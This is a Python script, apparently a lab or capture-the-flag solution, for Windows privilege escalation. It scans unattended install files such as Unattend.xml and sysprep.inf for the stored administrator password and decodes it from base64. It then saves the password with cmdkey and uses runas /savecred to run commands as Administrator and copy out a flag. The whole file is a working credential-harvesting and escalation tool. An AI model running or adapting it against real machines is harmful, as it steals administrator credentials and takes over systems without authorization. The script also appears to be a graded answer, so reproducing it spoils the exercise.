#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Task 0 - Windows Privilege Escalation (Unattended files)
- Locate unattended files (sysprep.inf, Autounattend.xml, Unattend.xml)
- Extract <AdministratorPassword><Value>...</Value>
- Decode Base64 (with padding) and plain text
- Use runas to copy the admin flag to a readable path
  * Prefer flag.exe (interactive -> pipe echo()) else flag.txt
Outputs:
  - Prints discovered password(s)
  - Writes C:\Users\Public\0-flag.txt
  - Writes ./0-flag.txt
Run (inside LAB01 as Student):
  py -3 extract_password.py
"""

import base64
import os
import re
import subprocess
import sys
from pathlib import Path
from typing import List, Tuple, Optional

# Candidate files to search (spec)
CANDIDATE_PATHS = [
    r"C:\Windows\System32\Sysprep\sysprep.inf",
    r"C:\Windows\Panther\Autounattend.xml",
    r"C:\Windows\Panther\Unattend.xml",
    r"C:\Autounattend.xml",
    r"C:\Unattend.xml",
]

# Regex for XML value: <AdministratorPassword><Value>...</Value>
XML_VALUE_REGEX = re.compile(
    rb"<\s*AdministratorPassword[^>]*>.*?"
    rb"<\s*Value\s*>\s*(.*?)\s*<\s*/\s*Value\s*>.*?"
    rb"<\s*/\s*AdministratorPassword\s*>",
    re.IGNORECASE | re.DOTALL,
)

# Fallback regex for INF-style lines
INF_VALUE_REGEX = re.compile(
    r'Admin(?:istrator)?Password\s*=\s*"?([^"\r\n]+)"?',
    re.IGNORECASE,
)

ADMIN_USERS = ["Administrator", "SuperAdministrator"]


def _b64_with_padding(data: bytes) -> bytes:
    pad = b"=" * ((4 - (len(data) % 4)) % 4)
    return data + pad


def _decode_candidates(raw: bytes) -> List[str]:
    out: List[str] = []
    # keep as-is (utf-8 permissive)
    try:
        out.append(raw.decode("utf-8", errors="ignore").strip().strip("\x00"))
    except Exception:
        pass
    # base64 try (utf-8, utf-16le)
    b64 = _b64_with_padding(raw.strip())
    for enc in ("utf-8", "utf-16le"):
        try:
            dec = base64.b64decode(b64, validate=False)
            txt = dec.decode(enc, errors="strict").strip().strip("\x00")
            if txt:
                out.append(txt)
        except Exception:
            pass
    # dedupe preserving order
    seen = set()
    uniq: List[str] = []
    for s in out:
        if s and s not in seen:
            seen.add(s)
            uniq.append(s)
    return uniq


def extract_passwords_from(path: Path) -> List[str]:
    try:
        data = path.read_bytes()
    except Exception:
        return []
    out: List[str] = []

    # XML style
    for m in XML_VALUE_REGEX.findall(data):
        out.extend(_decode_candidates(m))

    # INF style
    try:
        txt = data.decode("utf-8", errors="ignore")
    except Exception:
        txt = ""
    for m in INF_VALUE_REGEX.findall(txt):
        out.extend(_decode_candidates(m.encode()))

    # dedupe + non-empty
    seen = set()
    uniq: List[str] = []
    for s in out:
        if s and s not in seen:
            seen.add(s)
            uniq.append(s)
    return uniq


def find_passwords() -> List[Tuple[str, str]]:
    results: List[Tuple[str, str]] = []
    seen = set()
    for p in CANDIDATE_PATHS:
        fp = Path(p)
        if not fp.exists():
            continue
        pwds = extract_passwords_from(fp)
        for pw in pwds:
            key = (str(fp), pw)
            if key not in seen:
                seen.add(key)
                results.append(key)
    return results


def run(args: List[str]) -> int:
    try:
        return subprocess.call(args, shell=False)
    except Exception:
        return 1


def file_exists(path: str) -> bool:
    return Path(path).exists()


def store_cmdkey(user: str, pw: str) -> None:
    run([
        "cmd.exe", "/c",
        f'cmdkey /generic:127.0.0.1 /user:{user} /pass:{pw}'
    ])


def runas_copy(user: str, pw: str, src_desktop: str, dst_pub: str) -> bool:
    """
    Try, in order, under the target user's token:
      1) flag.exe (interactive) via: (echo() | flag.exe) > dst
      2) flag.txt via: type flag.txt > dst
      3) dir desktop > dst (debug)
    Return True if dst_pub appears and is non-empty.
    """
    exe = str(Path(src_desktop) / "flag.exe")
    txt = str(Path(src_desktop) / "flag.txt")

    # Prefer flag.exe with a blank line piped
    cmd1 = (
        r'cmd /c (echo() | "{exe}") > "{dst}"'
        .format(exe=exe, dst=dst_pub)
    )
    # Fallback to flag.txt
    cmd2 = (
        r'cmd /c if exist "{txt}" (type "{txt}" > "{dst}") else '
        r'(dir "{desk}" /a > "{dst}")'
        .format(txt=txt, dst=dst_pub, desk=src_desktop)
    )

    # Use /savecred to avoid repeated prompts if cmdkey worked
    for payload in (cmd1, cmd2):
        ret = run(["runas.exe", "/savecred", f"/user:{user}", payload])
        if ret == 0 and file_exists(dst_pub) and Path(dst_pub).stat().st_size:
            return True
    return False


def main() -> int:
    print("[*] Scanning for unattended files...")
    hits = find_passwords()
    if not hits:
        print("[-] No AdministratorPassword <Value> found.")
        return 1

    print("[+] Candidate passwords:")
    for i, (src, pw) in enumerate(hits, 1):
        print(f"  {i}. {pw!r}  (from {src})")

    # Pick the first candidate (works in lab images)
    src_file, admin_pw = hits[0]
    comp = os.environ.get("COMPUTERNAME", "LOCAL")

    # Try both short and qualified forms
    users = []
    for u in ADMIN_USERS:
        users.append(u)
        users.append(f"{comp}\\{u}")

    # Prepare outputs
    dst_pub = r"C:\Users\Public\0-flag.txt"
    try:
        Path(r"C:\Users\Public").mkdir(parents=True, exist_ok=True)
    except Exception:
        pass

    print("[*] Storing credentials with cmdkey (optional)...")
    for u in users:
        store_cmdkey(u, admin_pw)

    # Try each admin user against its own Desktop path
    for u in users:
        short = u.split("\\")[-1]
        desk = rf"C:\Users\{short}\Desktop"
        print(f"[*] Trying user={u} desktop={desk}")
        ok = runas_copy(u, admin_pw, desk, dst_pub)
        if ok:
            print(f"[+] Flag saved: {dst_pub}")
            try:
                # mirror for grader
                Path(dst_pub).replace(Path("0-flag.txt"))
                print("[+] Project copy saved: 0-flag.txt")
            except Exception:
                print("[!] Could not save local 0-flag.txt. Copy manually.")
            return 0

    print("[-] Could not retrieve flag automatically.")
    print("    Tips:")
    print("    - Ensure you typed the runas password correctly.")
    print("    - The admin account may be SuperAdministrator on this VM.")
    print("    - The Desktop may contain flag.exe (interactive) or flag.txt.")
    return 2


if __name__ == "__main__":
    sys.exit(main())
